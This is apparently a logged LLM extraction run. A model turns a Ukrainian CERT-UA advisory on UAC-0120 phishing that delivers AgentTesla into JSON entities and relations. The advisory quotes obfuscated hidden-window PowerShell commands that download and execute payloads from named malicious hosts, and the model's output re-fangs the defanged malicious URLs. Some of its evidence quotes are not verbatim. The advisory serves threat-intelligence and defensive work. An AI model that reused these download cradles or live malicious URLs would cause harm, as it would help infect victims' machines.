@@ -1,0 +1,275 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Security Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Software Vulnerability, Vulnerability, Common Vulnerabilities and Exposures)
+- Software Product: An application, operating system, or suite of computer programs designed to perform specific tasks or functions. (also: Software, Software Application)
+- Software Vendor: An organization or company that develops, distributes, or maintains software, hardware, or related technology products and services. (also: Technology Vendor, Software Developer, Vendor)
+- Country: A distinct territorial body or sovereign state with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Government Organization: An official agency, ministry, or administrative body operating as part of a national or state government. (also: Government Agency, Government Body, State Authority)
+- Malware: Malicious software, code, or executables designed to infiltrate, damage, or compromise computer systems and data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address specifying the location and retrieval mechanism of a resource on a computer network. (also: URL, Web Address, Web Link)
+- Person: An individual human being, such as a government official, cybersecurity expert, researcher, or executive. (also: Individual, Natural Person)
+- IP Address: A numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Electronic Mail Address)
+- Computer File: A digital resource or named item stored on a computer system, containing data, code, or instructions. (also: File, Digital File, Filename)
+- Company: A commercial business, corporation, or enterprise operating in any economic sector or industry. (also: Enterprise, Corporation, Commercial Organization)
+- Domain Name: A human-readable identification string defining a realm of administrative autonomy or resource location within the Internet Domain Name System. (also: Internet Domain, FQDN, Fully Qualified Domain Name)
+- Threat Actor: An individual, group, or organization responsible for malicious cyber activities, attacks, or cyber espionage operations. (also: Threat Group, Cyber Threat Actor, Hacker Group)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+- uses: The subject threat actor or malware utilizes the object tool, infrastructure, or malware.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA 30 і 31 серпня 2022 року зафіксовано масові розсилки електронних листів з темами "Технічне креслення" ("Technisches Zeichnen") серед українських, австрійських та німецьких організацій.</p><p> У вкладенні до електронного листа знаходиться IMG-файл (наприклад, "Технічне креслення.img"), що містить одноіменний CHM-файл, відкриття якого призведе до виконання JavaScript-коду, який, в свою чергу, забезпечить завантаження та виконання файлу node.txt за допомогою PowerShell.</p><p> Згаданий файл містить PowerShell-код, який здійснить декодування, декомпресію (Gzip) і виконання DLL та EXE файлів. Файл EXE є шкідливою програмою AgentTesla.</p><p> Зауважимо, що аналогічні розсилки також зафіксовано 11.08.2022, при цьому, електронні листи містили вкладення/тему "Договірна документація".</p><p> Активність тимчасово відстежується за ідентифікатором UAC-0120.</p><p><br></p><p><strong>Індикатори компрометації:</strong></p><p>Файли:</p><pre class="ql-syntax" spellcheck="false">2cffb660f00ee2192270871b22ed0cfa    da6ec25b71a864691f14d0f05206a41d8048da20813078553a841154d37884df    Технічне креслення.img
+4fdf3bcef29d971538db6123aa2b790a    954e24d36e9e6949723a6c1b8f1274c9eb3efd50eb6328da9b9389d170382dfb    Technisches Zeichnen.img
+2ea4c2a45e726b9549f2143ecd79a6b0    42a3649b09af5240e45cecceaf7f2687eccfa986644634e8cf101621eb85c8ff    Technisches Zeichnen.img
+c4f351ca77c677737b3cd4e315c73583    1a5c663ce00d4cf51ca41563f84184db0da405aa0a2004d12c8931af9f56e8de    Dessin technique.img
+a1a0d974b78dc4ee6a370473dd98ebf3    3a1bdab276e6a89b79d90d09d348f21fb0a2df484922e68de667183add7a68f4    Technisches Zeichnen.chm
+1a090868b09e7e3693444d471c369f53    4c8860ac0e41d9a8d311a632366ea15d245c2abe139f1ced0dbbfe87e974e852    Technisches Zeichnen.chm
+86a25d9b475bae330de40c78009d8079    f307bb1e8bdf77afc88118d99d9cfbecd390e870c66645b3730ade8477bc23d4    gtrhgfh.htm
+2b4122ee9268a8145484204364d9f8d8    0264c5832e9224ea2efc028ae6f06af86ab0035356ae17d3ed9e2e9bf1d8eef9    j1fgh00.htm  
+426986b949fab90f087762849f8d1f6f    85752ce0ce2b21bebf1f8ce070d1c124d9941f84b021c3f68bd029f37a339d03    node.txt
+cd9c91dc759bde5041aa2838e9cdb3fd    9569969db54356f6902ae907c4b4498fe4f11298468b758cb7d4479fa6f72a5b    y74gh00rffd.dll (Інжектор)
+062e5d6aedf7c4fe4b6058be643b8153    72bcbaac804b9043831a570e2d39e63576138b3f849055a5f0162c0afad3e9cb    RegAsm.exe (AgentTesla)
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">eric.fehling@t-online[.]de
+bondar_mob@ukr[.]net
+bonitet_ltd@ukr[.]net
+adv.rsnord@westafrance[.]com
+a.bindhammer@aon[.]at
+a.ehrnhofer@aon[.]at
+a.bernsteiner@aon[.]at
+
+fXp://ftp.ssttekstil[.]com/
+hXXps://academiadutygroup.com[.]br/sticky.txt
+hXXps://sackmeister[.]de/node.txt
+pro@ssttekstil.com
+ftp.ssttekstil[.]com
+sackmeister[.]de
+ssttekstil[.]com
+academiadutygroup.com[.]br
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">powershell.exe -WindowStyle hidden $t0='DE5'.replace('D','I').replace('5','x');sal P $t0;$ErrorActionPreference = 'SilentlyContinue';$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;'[void' + '] [Syst' + 'em.Refle' + 'ction.Asse' + 'mbly]::LoadWi' + 'thPartialName(''Microsoft.VisualBasic'')'|P;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty='(New-'+'Obje'+'ct Ne'+'t.We'+'bCli'+'ent)'|P;$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'Down' + 'load' + 'Str' + 'ing',[Microsoft.VisualBasic.CallType]::Method,'https' + '://academiadutygroup.com[.]br/sticky.txt')|P
+powershell.exe -WindowStyle hidden $t0='DE5'.replace('D','I').replace('5','x');sal P $t0;$ErrorActionPreference = 'SilentlyContinue';$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;'[void' + '] [Syst' + 'em.Refle' + 'ction.Asse' + 'mbly]::LoadWi' + 'thPartialName(''Microsoft.VisualBasic'')'|P;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty='(New-'+'Obje'+'ct Ne'+'t.We'+'bCli'+'ent)'|P;$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'Down' + 'load' + 'Str' + 'ing',[Microsoft.VisualBasic.CallType]::Method,'https' + '://sackmeister[.]de/node.txt')|P
+</pre><p><br></p><p><strong>Графічні зображення:</strong></p><p><strong>﻿</strong></p>
+
+=== RESPONSE (4.9s, in 3802 / out 1679 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "UAC-0120",
+      "kind": "threat actor",
+      "gloss": "A threat actor tracked by CERT-UA associated with malicious email distribution campaigns."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign state in Eastern Europe."
+    },
+    {
+      "name": "Австрія",
+      "kind": "country",
+      "gloss": "A sovereign state in Central Europe."
+    },
+    {
+      "name": "Німеччина",
+      "kind": "country",
+      "gloss": "A sovereign state in Central Europe."
+    },
+    {
+      "name": "AgentTesla",
+      "kind": "malware",
+      "gloss": "An advanced spyware and remote access trojan malware family."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "Технічне креслення.img",
+      "kind": "computer file",
+      "gloss": "A disk image file used as a malicious email attachment."
+    },
+    {
+      "name": "Technisches Zeichnen.img",
+      "kind": "computer file",
+      "gloss": "A malicious disk image attachment distributed via email."
+    },
+    {
+      "name": "Dessin technique.img",
+      "kind": "computer file",
+      "gloss": "A malicious disk image file used in phishing distribution."
+    },
+    {
+      "name": "Technisches Zeichnen.chm",
+      "kind": "computer file",
+      "gloss": "A compiled HTML help file used to execute malicious scripts."
+    },
+    {
+      "name": "node.txt",
+      "kind": "computer file",
+      "gloss": "A file containing malicious PowerShell code designed to decode and execute payloads."
+    },
+    {
+      "name": "y74gh00rffd.dll",
+      "kind": "computer file",
+      "gloss": "A dynamic link library file functioning as an injector."
+    },
+    {
+      "name": "RegAsm.exe",
+      "kind": "computer file",
+      "gloss": "An executable file containing the AgentTesla malware payload."
+    },
+    {
+      "name": "gtrhgfh.htm",
+      "kind": "computer file",
+      "gloss": "An HTML file associated with malicious execution."
+    },
+    {
+      "name": "j1fgh00.htm",
+      "kind": "computer file",
+      "gloss": "An HTML file used in malicious execution chains."
+    },
+    {
+      "name": "eric.fehling@t-online.de",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "bondar_mob@ukr.net",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "bonitet_ltd@ukr.net",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "adv.rsnord@westafrance.com",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "a.bindhammer@aon.at",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "a.ehrnhofer@aon.at",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "a.bernsteiner@aon.at",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "pro@ssttekstil.com",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator of compromise."
+    },
+    {
+      "name": "ftp.ssttekstil.com",
+      "kind": "domain name",
+      "gloss": "A domain name observed in malicious network infrastructure."
+    },
+    {
+      "name": "sackmeister.de",
+      "kind": "domain name",
+      "gloss": "A domain name used to host malicious files."
+    },
+    {
+      "name": "ssttekstil.com",
+      "kind": "domain name",
+      "gloss": "A domain name associated with malicious network activity."
+    },
+    {
+      "name": "academiadutygroup.com.br",
+      "kind": "domain name",
+      "gloss": "A domain name used to host malicious payloads."
+    },
+    {
+      "name": "https://academiadutygroup.com.br/sticky.txt",
+      "kind": "uniform resource locator",
+      "gloss": "A malicious URL hosting a payload script."
+    },
+    {
+      "name": "https://sackmeister.de/node.txt",
+      "kind": "uniform resource locator",
+      "gloss": "A malicious URL hosting the node.txt script."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0120",
+      "type": "uses",
+      "tail": "AgentTesla",
+      "evidence": "Файл EXE є шкідливою програмою AgentTesla. Активність тимчасово відстежується за ідентифікатором UAC-0120."
+    },
+    {
+      "head": "node.txt",
+      "type": "delivers",
+      "tail": "AgentTesla",
+      "evidence": "node.txt... здійснить декодування, декомпресію (Gzip) і виконання DLL та EXE файлів. Файл EXE є шкідливою програмою AgentTesla"
+    },
+    {
+      "head": "academiadutygroup.com.br",
+      "type": "hosts",
+      "tail": "https://academiadutygroup.com.br/sticky.txt",
+      "evidence": "https://academiadutygroup.com.br/sticky.txt"
+    },
+    {
+      "head": "sackmeister.de",
+      "type": "hosts",
+      "tail": "https://sackmeister.de/node.txt",
+      "evidence": "https://sackmeister.de/node.txt"
+    },
+    {
+      "head": "https://sackmeister.de/node.txt",
+      "type": "delivers",
+      "tail": "node.txt",
+      "evidence": "https://sackmeister.de/node.txt"
+    }
+  ],
+  "newRelationTypes": []
+}
